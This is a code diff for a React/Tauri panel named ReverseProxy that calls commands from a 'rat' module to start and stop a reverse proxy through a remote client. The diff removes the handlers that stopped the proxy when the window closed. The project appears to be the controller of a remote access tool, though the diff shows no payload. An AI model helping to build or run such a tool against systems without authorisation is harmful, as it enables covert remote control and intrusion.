@@ -1,8 +1,6 @@
 import { useParams } from "react-router-dom";
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import { startReverseProxyCmd, stopReverseProxyCmd } from "../rat/RATCommands";
-import { getCurrent } from "@tauri-apps/api/window";
-import { listen } from "@tauri-apps/api/event";
 
 export const ReverseProxy = () => {
   const { addr } = useParams();
@@ -19,56 +17,6 @@ export const ReverseProxy = () => {
     await stopReverseProxyCmd(addr);
     setRunning(false);
   }
-
-  useEffect(() => {
-    const handleBeforeUnload = () => {
-      console.log("beforeunload");
-      stop_reverse_proxy();
-    };
-
-    window.addEventListener("beforeunload", handleBeforeUnload);
-
-    return () => {
-      window.removeEventListener("beforeunload", handleBeforeUnload);
-    };
-  }, []);
-
-  useEffect(() => {
-    const cleanup = async () => {
-      try {
-        const window = getCurrent();
-
-        await window.listen("tauri://close-requested", async () => {
-          stop_reverse_proxy();
-          window.close();
-        });
-      } catch (error) {
-        console.error("Error setting up window close handler:", error);
-      }
-    };
-
-    cleanup();
-
-    return () => {
-      stop_reverse_proxy();
-    };
-  }, []);
-
-  useEffect(() => {
-    let cleanupFn: (() => void) | undefined;
-
-    let window = getCurrent();
-
-    listen("close_window", () => {
-      window.close();
-    }).then((unlisten) => {
-      cleanupFn = unlisten;
-    });
-
-    return () => {
-      if (cleanupFn) cleanupFn();
-    };
-  }, []);
 
   return (
     <div className="p-6 w-full h-screen bg-primarybg box-border overflow-hidden relative text-white">
